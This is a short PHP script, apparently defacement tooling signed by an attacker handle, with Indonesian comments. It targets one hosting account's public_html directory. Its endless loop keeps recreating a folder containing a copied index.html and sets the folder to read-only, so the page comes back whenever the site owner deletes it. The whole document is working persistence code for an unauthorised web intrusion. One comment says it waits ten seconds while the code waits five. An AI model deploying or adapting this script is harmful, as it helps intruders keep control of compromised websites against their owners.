// code by root@x-krypt0n-x : system of pekalongan
<?php
$dir = '/home/ptrpvokasi/public_html/';
$folderName = '-';
$folderPath = $dir . '/' . $folderName;
$indexFile = 'index.html';

while (true) {
  if (!file_exists($folderPath)) {
    mkdir($folderPath, 0777, true); // bikin folder A karna variable $folderPath itu = A
    $indexFilePath = $folderPath . '/' . $indexFile;
    copy($indexFile, $indexFilePath); // copy file index.html
    chmod($folderPath, 0555); // chmod 555 biar ga bisa diedit
    echo "Folder $folderName created and $indexFile copied to $folderName folder. Folder permission set to 555.\n";
  } else {
    $indexFilePath = $folderPath . '/' . $indexFile;
    if (!file_exists($indexFilePath)) {
      chmod($folderPath, 0777); // chmod 777 biar bisa upload file ke folder A dan bisa ngedit dalemannya
      copy($indexFile, $indexFilePath);
      chmod($folderPath, 0555); // chmod 555 biar ga bisa diedit
      echo "$indexFile copied to $folderName folder. Folder permission set to 777 and then 555.\n";
    } else {
      echo "$indexFile already exists in $folderName folder.\n";
    }
  }
  sleep(5); // nunggu 10 detik buat cek ulang, kalo folder A atau index.html nya ke delete dia bakal auto bikin lagi
}
?>
